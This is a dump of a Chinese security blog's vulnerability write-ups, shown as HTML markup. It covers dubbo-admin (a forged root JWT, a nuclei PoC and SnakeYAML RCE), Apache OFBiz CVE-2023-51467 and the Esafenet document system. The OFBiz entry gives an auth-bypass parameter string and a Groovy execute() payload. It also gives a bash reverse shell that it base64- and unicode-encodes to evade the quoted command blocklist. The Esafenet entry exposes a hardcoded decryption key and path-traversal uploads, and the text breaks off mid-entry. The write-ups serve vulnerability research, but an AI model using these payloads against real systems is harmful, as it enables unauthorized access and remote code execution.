class_">Date</span>(timeStamp);<br>        <span class="hljs-keyword">final</span> <span class="hljs-type">SignatureAlgorithm</span> <span class="hljs-variable">defaultAlgorithm</span> <span class="hljs-operator">=</span> SignatureAlgorithm.HS512;<br>        Map&lt;String, Object&gt; claims = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;(<span class="hljs-number">1</span>);<br>        claims.put(<span class="hljs-string">&quot;sub&quot;</span>, rootUserName);<br>        <span class="hljs-keyword">return</span> Jwts.builder()<br>                .setClaims(claims)<br>                .setExpiration(date)<br>                .setIssuedAt(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(System.currentTimeMillis()))<br>                .signWith(defaultAlgorithm, secret)<br>                .compact();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">root</span> <span class="hljs-operator">=</span> jwt.generateToken(<span class="hljs-string">&quot;root&quot;</span>);<br>        System.out.println(root);<br><br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>In this way, you can get root’s jwt.</p><p>Calculate and get</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jwt">eyJhbGciOiJIUzUxMiJ9.eyJleHAiOjk5OTk5OTk5OTksInN1YiI6InJvb3QiLCJpYXQiOjE2OTkwODM2Mzd9.wKRqJkWxr_nVDcVVF5rniqhnACtqaDnYUUu55g-atkIwRIt1A-SMpKqBN5zrGZl4kFVcrjzMvXsYqfqf0N9Gbg<br></code></pre></td></tr></table></figure><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">id:</span> <span class="hljs-string">dubbo-admin_Unauthorized_bypass</span><br><span class="hljs-attr">info:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">Template</span> <span class="hljs-string">Name</span><br>  <span class="hljs-attr">author:</span> <br>  <span class="hljs-attr">severity:</span> <span class="hljs-string">medium</span><br>  <span class="hljs-attr">description:</span> <span class="hljs-string">dubbo-admin</span> <span class="hljs-string">Unauthorized</span> <span class="hljs-string">access</span> <span class="hljs-string">bypass</span><br>  <span class="hljs-attr">reference:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">https://</span><br>  <span class="hljs-attr">tags:</span> <span class="hljs-string">apache,dubbo-admin</span><br><span class="hljs-attr">requests:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">raw:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">|+</span><br><span class="hljs-string">        GET /api/dev/consumers HTTP/1.1</span><br><span class="hljs-string">        Host: &#123;&#123;Hostname&#125;&#125;</span><br><span class="hljs-string">        Accept: application/json, text/plain, */*</span><br><span class="hljs-string">        Authorization: eyJhbGciOiJIUzUxMiJ9.eyJleHAiOjk5OTk5OTk5OTksInN1YiI6InJvb3QiLCJpYXQiOjE2OTkwODM2Mzd9.wKRqJkWxr_nVDcVVF5rniqhnACtqaDnYUUu55g-atkIwRIt1A-SMpKqBN5zrGZl4kFVcrjzMvXsYqfqf0N9Gbg</span><br><span class="hljs-string">        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36</span><br><span class="hljs-string">        Referer: http://&#123;&#123;Hostname&#125;&#125;/</span><br><span class="hljs-string">        Accept-Encoding: gzip, deflate</span><br><span class="hljs-string">        Accept-Language: zh-CN,zh;q=0.9</span><br><span class="hljs-string">        Connection: close</span><br><span class="hljs-string"></span><br>    <span class="hljs-attr">matchers:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">type:</span> <span class="hljs-string">word</span><br>        <span class="hljs-attr">part:</span> <span class="hljs-string">header</span><br>        <span class="hljs-attr">words:</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-string">&#x27;HTTP/1.1 200 &#x27;</span><br><br></code></pre></td></tr></table></figure><p>A poc of nuclei. You can quickly verify permission bypass.</p><h2 id="0x03-尝试找r点"><a href="#0x03-尝试找r点" class="headerlink" title="0x03 尝试找r点"></a>0x03 尝试找r点</h2><p><img src="image-20231106195354794.png" alt="image-20231106195354794"></p><p>pom里面有snakeyaml。</p><p>自然想到yaml.load()。</p><p>org&#x2F;apache&#x2F;dubbo&#x2F;admin&#x2F;common&#x2F;util&#x2F;YamlParser.java</p><p><img src="image-20231106195602958.png" alt="image-20231106195602958"></p><p>最后找到这两个，可控的地方。</p><p>我门跟一下下面的</p><p>org&#x2F;apache&#x2F;dubbo&#x2F;admin&#x2F;service&#x2F;impl&#x2F;MeshRouteServiceImpl.java</p><p><img src="image-20231106195729394.png" alt="image-20231106195729394"></p><p>可以看到是检查mesh的规则。</p><p><img src="image-20231106195807880.png" alt="image-20231106195807880"></p><p>找一下调用，发现在创建规则和更新时都会触发。</p><p>org&#x2F;apache&#x2F;dubbo&#x2F;admin&#x2F;controller&#x2F;MeshRouteController.java</p><p><img src="image-20231106200004806.png" alt="image-20231106200004806"></p><p><img src="image-20231106200043446.png" alt="image-20231106200043446"></p><p>最后也是找到路由点。</p><p>接下来测试一下</p><p><img src="image-20231106201002652.png" alt="image-20231106201002652"></p><p>随便输入，然后替换为伪造的jwt</p><p><img src="image-20231106201127532.png" alt="image-20231106201127532"></p><p><img src="image-20231106201325511.png" alt="image-20231106201325511"></p><p>是能成功登入的</p><p>来到msh路由</p><p><img src="image-20231106201410048.png" alt="image-20231106201410048"></p><p><img src="image-20231106201624404.png" alt="image-20231106201624404"></p><p><img src="image-20231106201718869.png" alt="image-20231106201718869"></p><p><img src="image-20231106201800526.png" alt="image-20231106201800526"></p><p>跟进一下，发现SafeConstructor()开启了白名单。G.</p><p><img src="image-20231106202141390.png" alt="image-20231106202141390"></p><p>手动改了后，重新尝试。</p><p><img src="image-20231106202341361.png" alt="image-20231106202341361"></p><p><img src="image-20231106202403421.png" alt="image-20231106202403421"></p><p>可以成功执行。</p><p><img src="image-20231106202532708.png" alt="image-20231106202532708"></p><p>查看了一下版本 0.3开始SafeConstructor()，</p><p><img src="image-20231106202618841.png" alt="image-20231106202618841"></p><p>0.2看来可以的。</p><p><img src="image-20231106202833829.png" alt="image-20231106202833829"></p><p>单jwt机制在0.4引用。鸡肋。</p>]]></content>
    
    
    
    <tags>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ofbiz-CVE-2023-51467</title>
    <link href="/2024/01/09/ofbiz-CVE-2023-51467/"/>
    <url>/2024/01/09/ofbiz-CVE-2023-51467/</url>
    
    <content type="html"><![CDATA[<h2 id="ofbiz-CVE-2023-51467"><a href="#ofbiz-CVE-2023-51467" class="headerlink" title="ofbiz-CVE-2023-51467"></a>ofbiz-CVE-2023-51467</h2><h3 id="0x01-漏洞介绍"><a href="#0x01-漏洞介绍" class="headerlink" title="0x01 漏洞介绍"></a>0x01 漏洞介绍</h3><p>​ofbiz-18.12.10及以前，鉴权绕过使用<code>execute()</code>方法执行外部命令。</p><p>poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-string">&quot;calc&quot;</span>.execute()<br></code></pre></td></tr></table></figure><p>代码没有对Groovy脚本，<code>execute()</code>方法进行过滤。</p><p>最新版修了鉴权绕过，命令执行没有修复。</p><h3 id="0x02-命令过滤"><a href="#0x02-命令过滤" class="headerlink" title="0x02 命令过滤"></a>0x02 命令过滤</h3><p>在路径framework&#x2F;security&#x2F;config&#x2F;security.properties 里面存在命令黑名单。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml">deniedWebShellTokens=java.,beans,freemarker,&lt;script,javascript,&lt;body,body ,&lt;form,&lt;jsp:,&lt;c:out,taglib,&lt;prefix,&lt;%@ page,<span class="hljs-meta">&lt;?php,exec(,alert(,\</span><br><span class="hljs-meta">                     %eval,@eval,eval(,runtime,import,passthru,shell_exec,assert,str_rot13,system,decode,include,page ,\</span><br><span class="hljs-meta">                     chmod,mkdir,fopen,fclose,new file,upload,getfilename,download,getoutputstring,readfile,iframe,object,embed,onload,build,\</span><br><span class="hljs-meta">                     python,perl ,/perl,ruby ,/ruby,process,function,class,InputStream,to_server,wget ,static,assign,webappPath,\</span><br><span class="hljs-meta">                     ifconfig,route,crontab,netstat,uname ,hostname,iptables,whoami,&quot;cmd&quot;,*cmd|,+cmd|,=cmd|,localhost,thread,require,gzdeflate</span><br></code></pre></td></tr></table></figure><p>限制也不多，也可以直接使用unicode编码就可以绕过。</p><h3 id="0X03-Groovy分析"><a href="#0X03-Groovy分析" class="headerlink" title="0X03  Groovy分析"></a>0X03  Groovy分析</h3><p>apache-ofbiz-18.12.11&#x2F;framework&#x2F;webtools&#x2F;webapp&#x2F;webtools&#x2F;WEB-INF&#x2F;controller.xml </p><p>412-416行</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">request-map</span> <span class="hljs-attr">uri</span>=<span class="hljs-string">&quot;ProgramExport&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">security</span> <span class="hljs-attr">https</span>=<span class="hljs-string">&quot;true&quot;</span> <span class="hljs-attr">auth</span>=<span class="hljs-string">&quot;true&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">response</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;success&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;view&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;ProgramExport&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">response</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;error&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;view&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;ProgramExport&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">request-map</span>&gt;</span><br></code></pre></td></tr></table></figure><p>可以看到是view类型</p><p>652行写着对应配置位置</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">view-map</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;ProgramExport&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;screen&quot;</span> <span class="hljs-attr">page</span>=<span class="hljs-string">&quot;component://webtools/widget/EntityScreens.xml#ProgramExport&quot;</span>/&gt;</span><br><br></code></pre></td></tr></table></figure><p>apache-ofbiz-18.12.11&#x2F;framework&#x2F;webtools&#x2F;widget&#x2F;EntityScreens.xml</p><p>74-96行</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">screen</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;ProgramExport&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">section</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">actions</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">set</span> <span class="hljs-attr">field</span>=<span class="hljs-string">&quot;titleProperty&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;PageTitleEntityExportAll&quot;</span>/&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">set</span> <span class="hljs-attr">field</span>=<span class="hljs-string">&quot;tabButtonItem&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;programExport&quot;</span>/&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">location</span>=<span class="hljs-string">&quot;component://webtools/groovyScripts/entity/ProgramExport.groovy&quot;</span>/&gt;</span><span class="language-handlebars"><span class="language-xml"></span></span><br><span class="language-xml"><span class="language-handlebars">        <span class="hljs-tag">&lt;/<span class="hljs-name">actions</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">        <span class="hljs-tag">&lt;<span class="hljs-name">widgets</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">            <span class="hljs-tag">&lt;<span class="hljs-name">decorator-screen</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;CommonImportExportDecorator&quot;</span> <span class="hljs-attr">location</span>=<span class="hljs-string">&quot;$&#123;parameters.mainDecoratorLocation&#125;&quot;</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">                <span class="hljs-tag">&lt;<span class="hljs-name">decorator-section</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;body&quot;</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">                     <span class="hljs-tag">&lt;<span class="hljs-name">screenlet</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">                        <span class="hljs-tag">&lt;<span class="hljs-name">include-form</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;ProgramExport&quot;</span> <span class="hljs-attr">location</span>=<span class="hljs-string">&quot;component://webtools/widget/MiscForms.xml&quot;</span>/&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">                    <span class="hljs-tag">&lt;/<span class="hljs-name">screenlet</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">                    <span class="hljs-tag">&lt;<span class="hljs-name">screenlet</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">                        <span class="hljs-tag">&lt;<span class="hljs-name">platform-specific</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">                            <span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html-template</span> <span class="hljs-attr">location</span>=<span class="hljs-string">&quot;component://webtools/template/entity/ProgramExport.ftl&quot;</span>/&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">                        <span class="hljs-tag">&lt;/<span class="hljs-name">platform-specific</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">                    <span class="hljs-tag">&lt;/<span class="hljs-name">screenlet</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">                <span class="hljs-tag">&lt;/<span class="hljs-name">decorator-section</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">            <span class="hljs-tag">&lt;/<span class="hljs-name">decorator-screen</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">        <span class="hljs-tag">&lt;/<span class="hljs-name">widgets</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">    <span class="hljs-tag">&lt;/<span class="hljs-name">section</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars"><span class="hljs-tag">&lt;/<span class="hljs-name">screen</span>&gt;</span></span></span><br></code></pre></td></tr></table></figure><p>可以看见调用了</p><p> &#x2F;webtools&#x2F;groovyScripts&#x2F;entity&#x2F;ProgramExport.groovy</p><p>56-73行</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java">    parameters.groovyProgram = groovyProgram<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    groovyProgram = parameters.groovyProgram<br>&#125;<br><br><span class="hljs-comment">// Add imports for script.</span><br><span class="hljs-type">def</span> <span class="hljs-variable">importCustomizer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ImportCustomizer</span>()<br>importCustomizer.addImport(<span class="hljs-string">&quot;org.apache.ofbiz.entity.GenericValue&quot;</span>)<br>importCustomizer.addImport(<span class="hljs-string">&quot;org.apache.ofbiz.entity.model.ModelEntity&quot;</span>)<br><span class="hljs-type">def</span> <span class="hljs-variable">configuration</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CompilerConfiguration</span>()<br>configuration.addCompilationCustomizers(importCustomizer)<br><br><span class="hljs-type">Binding</span> <span class="hljs-variable">binding</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Binding</span>()<br>binding.setVariable(<span class="hljs-string">&quot;delegator&quot;</span>, delegator)<br>binding.setVariable(<span class="hljs-string">&quot;recordValues&quot;</span>, recordValues)<br><br><span class="hljs-type">ClassLoader</span> <span class="hljs-variable">loader</span> <span class="hljs-operator">=</span> Thread.currentThread().getContextClassLoader()<br><span class="hljs-type">def</span> <span class="hljs-variable">shell</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">GroovyShell</span>(loader, binding, configuration)<br></code></pre></td></tr></table></figure><p>从groovyProgram获取参数然后执行。</p><p>org&#x2F;apache&#x2F;ofbiz&#x2F;base&#x2F;util&#x2F;GroovyUtil.java</p><p><img src="image-20240102025028710.png" alt="image-20240102025028710"></p><p>这个回去去上面的配置，然后执行。</p><h3 id="0x04-鉴权绕过分析"><a href="#0x04-鉴权绕过分析" class="headerlink" title="0x04 鉴权绕过分析"></a>0x04 鉴权绕过分析</h3><p>org&#x2F;apache&#x2F;ofbiz&#x2F;webapp&#x2F;control&#x2F;LoginWorker.java#checkLogin</p><p><img src="image-20240109173229165.png" alt="image-20240109173229165"></p><p><img src="image-20240109173248165.png" alt="image-20240109173248165"></p><p>就是不满足if就可以返回success。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (username == <span class="hljs-literal">null</span><br>        || (password == <span class="hljs-literal">null</span> &amp;&amp; token == <span class="hljs-literal">null</span>)<br>        || <span class="hljs-string">&quot;error&quot;</span>.equals(login(request, response)))<br></code></pre></td></tr></table></figure><p><img src="image-20240109173337709.png" alt="image-20240109173337709"></p><p>username，password，token可控，可以构造。</p><p>看login(request, response)就行</p><p>java&#x2F;org&#x2F;apache&#x2F;ofbiz&#x2F;webapp&#x2F;control&#x2F;LoginWorker.java#login()</p><p><img src="image-20240109173652511.png" alt="image-20240109173652511"></p><p>判断username，password，token是否为null，不为null就是赋予值。</p><p>然后判断非空，不为空就赋予值</p><p>然后username，password，token非否为空,为空就在数组unpwErrMsgList加入数据。</p><p><img src="image-20240109174050423.png" alt="image-20240109174050423"></p><p>最重要的就是这里。</p><p>unpwErrMsgList只要不为空就进入if。然后requirePasswordChange可控，传入Y就可以返回suceess。</p><p><img src="image-20240109174308632.png" alt="image-20240109174308632"></p><p>然后不满足”error”.equals(login(request, response))，最后返回checkLogin()函数返回success，绕过鉴权。</p><p>最后构造poc。不赋值获取到的是””，不是NULL，””不等于NULL,为false，但使用isNotEmpty()判断时是true。</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts">USERNAME=<span class="hljs-variable">&amp;</span>PASSWORD=<span class="hljs-variable">&amp;</span>TOKEN=<span class="hljs-variable">&amp;</span>requirePasswordC<span class="hljs-attr">hange</span><span class="hljs-operator">=</span>y<br></code></pre></td></tr></table></figure><h3 id="0x05-复现"><a href="#0x05-复现" class="headerlink" title="0x05  复现"></a>0x05  复现</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-string">&quot;$&#123;&#x27;your command&#x27;.execute()&#125;&quot;</span><br></code></pre></td></tr></table></figure><p>对open -a calculator</p><p><img src="image-20240102021202674.png" alt="image-20240102021202674"></p><p>对Reverse Shell进行unicode编码进行测试。</p><p>先对Reverse Shell转换成java可以识别的形式</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">/bin/bash -i &gt;&amp; /dev/tcp/127.0.0.1/8888 0&gt;&amp;1<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">bash -c &#123;echo,L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEyNy4wLjAuMS84ODg4IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;<br></code></pre></td></tr></table></figure><p>在使用unicode编码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">\u0062\u0061\u0073\u0068\u0020\u002D\u0063\u0020\u007B\u0065\u0063\u0068\u006F\u002C\u004C\u0032\u004A\u0070\u0062\u0069\u0039\u0069\u0059\u0058\u004E\u006F\u0049\u0043\u0031\u0070\u0049\u0044\u0034\u006D\u0049\u0043\u0039\u006B\u005A\u0058\u0059\u0076\u0064\u0047\u004E\u0077\u004C\u007A\u0045\u0079\u004E\u0079\u0034\u0077\u004C\u006A\u0041\u0075\u004D\u0053\u0038\u0034\u004F\u0044\u0067\u0034\u0049\u0044\u0041\u002B\u004A\u006A\u0045\u003D\u007D\u007C\u007B\u0062\u0061\u0073\u0065\u0036\u0034\u002C\u002D\u0064\u007D\u007C\u007B\u0062\u0061\u0073\u0068\u002C\u002D\u0069\u007D<br></code></pre></td></tr></table></figure><p>成功获取shell</p><p><img src="image-20240102020946197.png" alt="image-20240102020946197"></p>]]></content>
    
    
    
    <tags>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>亿赛通电子文档代码审计</title>
    <link href="/2023/12/22/%E4%BA%BF%E8%B5%9B%E9%80%9A%E7%94%B5%E5%AD%90%E6%96%87%E6%A1%A3%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    <url>/2023/12/22/%E4%BA%BF%E8%B5%9B%E9%80%9A%E7%94%B5%E5%AD%90%E6%96%87%E6%A1%A3%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
    
    <content type="html"><![CDATA[<h2 id="0x01-漏洞分析"><a href="#0x01-漏洞分析" class="headerlink" title="0x01 漏洞分析"></a>0x01 漏洞分析</h2><p>​亿赛通电子文档安全管理系统最近很火热，趁热分析一波。</p><h2 id="0x02-（1day）jdbc反序列化"><a href="#0x02-（1day）jdbc反序列化" class="headerlink" title="0x02  （1day）jdbc反序列化"></a>0x02  （1day）jdbc反序列化</h2><p>没什么用，安装包没有mysql依赖。</p><p><img src="image-20231222174021402.png" alt="image-20231222174021402"></p><p><img src="image-20231222174046008.png" alt="image-20231222174046008"></p><p>路由 &#x2F;CDGServer3&#x2F;LdapAjax</p><p>对应com.esafenet.servlet.ajax.DBAjax</p><p><img src="image-20231220093540537.png" alt="image-20231220093540537"></p><p>doPost接受传参command，若果等于testConnection就调用testConnection方法。</p><p><img src="image-20231222121135375.png" alt="image-20231222121135375"></p><p>testConnection会获取数据库账号密码，ip，configvalues，然后判断使用什么数据库，然后调用connection方法。</p><p><img src="image-20231220094157288.png" alt="image-20231220094157288"></p><p>然后就是反射获取服务，链接。全都可以控制，很容易就想起jdbc。</p><p>webapps&#x2F;CDGServer3&#x2F;config&#x2F;DBConfig.jsp</p><p>jsp里面有对应传输的格式。</p><p><img src="image-20231220094540250.png" alt="image-20231220094540250"></p><h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p><img src="image-20231220095830915.png" alt="image-20231220095830915"></p><h2 id="0x02-1day？nday-xstreem反序列化"><a href="#0x02-1day？nday-xstreem反序列化" class="headerlink" title="0x02 (1day？nday)xstreem反序列化"></a>0x02 (1day？nday)xstreem反序列化</h2><p>查看lib，发现存在低版本的xstream的环境包，很自然就可以想到xstream低版本反序列化漏洞。</p><p><img src="image-20231221170223093.png" alt="image-20231221170223093"></p><p>所以只需要找到一个servlet的里面调用了fromXML就可以了。</p><p>所以我们找servlet里面的service方法，看谁调用了fromXML方法就可以了.</p><p>由于触发点很多，我们希望只在service里面就找到触发点。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">MATCH  (m1:Method &#123;NAME: <span class="hljs-string">&quot;service&quot;</span>&#125;) WHERE m1.CLASSNAME =~ <span class="hljs-string">&quot;com.esafenet.servlet.service.*&quot;</span><br><span class="hljs-type">MATCH</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> (m1)-[:CALL]-(m2:Method &#123;NAME:<span class="hljs-string">&quot;fromXML&quot;</span>&#125;) <br>RETURN path<br></code></pre></td></tr></table></figure><p><img src="image-20231222115957326.png" alt="image-20231222115957326"></p><p>这样我们就得到只调用一次就出发漏洞。可以看到很多点。</p><p>找其中一个路由 &#x2F;CDGServer3&#x2F;UserLoginOutService1</p><p><img src="image-20231222203249063.png" alt="image-20231222203249063"></p><p>在web.xml找对应的可以进行分析<img src="image-20231222120846744.png" alt="image-20231222120846744"></p><p>对应 com.esafenet.servlet.service.UserLoginOutService1</p><p><img src="../../../../CDGServer3/image-20231220110956649.png" alt="image-20231220110956649"></p><p>从request获取，然后fromXML。</p><p>所有重点就是看ServiceUtil.getXMLFromRequest(), 怎么处理。</p><p><img src="image-20231220111054322.png" alt="image-20231220111054322"></p><p><img src="image-20231220111148015.png" alt="image-20231220111148015"></p><p>它会先getXMLFromRequest0获取流转化string，然后调用decodeString解密。</p><p><img src="image-20231220111230823.png" alt="image-20231220111230823"></p><p>对应的解密算法。</p><p><img src="image-20231220111247987.png" alt="image-20231220111247987"></p><p>密钥</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">byte</span>[] abyte0 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[]&#123;-<span class="hljs-number">21</span>, -<span class="hljs-number">112</span>, <span class="hljs-number">90</span>, -<span class="hljs-number">68</span>, <span class="hljs-number">5</span>, <span class="hljs-number">44</span>, <span class="hljs-number">85</span>, -<span class="hljs-number">86</span>, -<span class="hljs-number">21</span>, -<span class="hljs-number">112</span>, <span class="hljs-number">90</span>, -<span class="hljs-number">68</span>, <span class="hljs-number">5</span>, <span class="hljs-number">44</span>, <span class="hljs-number">85</span>, -<span class="hljs-number">86</span>&#125;;<br><br></code></pre></td></tr></table></figure><p>所以找对应的加密算法就可以。</p><p><img src="image-20231220111407884.png" alt="image-20231220111407884"></p><p>对应的加密算法。剩下就是xstreem的漏洞流程。</p><h3 id="复现-1"><a href="#复现-1" class="headerlink" title="复现"></a>复现</h3><p><img src="image-20231220113409891.png" alt="image-20231220113409891"></p><p><img src="image-20231220113437458.png" alt="image-20231220113437458"></p><h2 id="0x03-（nday）文件上传-1"><a href="#0x03-（nday）文件上传-1" class="headerlink" title="0x03 （nday）文件上传 -1"></a>0x03 （nday）文件上传 -1</h2><h3 id="DecryptApplicationService2-uoload"><a href="#DecryptApplicationService2-uoload" class="headerlink" title="DecryptApplicationService2_uoload"></a>DecryptApplicationService2_uoload</h3><p>com.esafenet.servlet.service.smartsec.DecryptApplicationService2</p><p><img src="image-20231222174545123.png" alt="image-20231222174545123"></p><p><img src="image-20231222174629936.png" alt="image-20231222174629936"></p><p>没什么好分析的，从获取fileId然后拼接路径，获取iStream直接写入。</p><p>fileId没有过滤，可以目录穿越写入导致rce.</p><h2 id="0x04（nday）文件上传-2"><a href="#0x04（nday）文件上传-2" class="headerlink" title="0x04（nday）文件上传 -2"></a>0x04（nday）文件上传 -2</h2><h3 id="UploadFileFromClientServiceForClient-upload"><a href="#UploadFileFromClientServiceForClient-upload" class="headerlink" 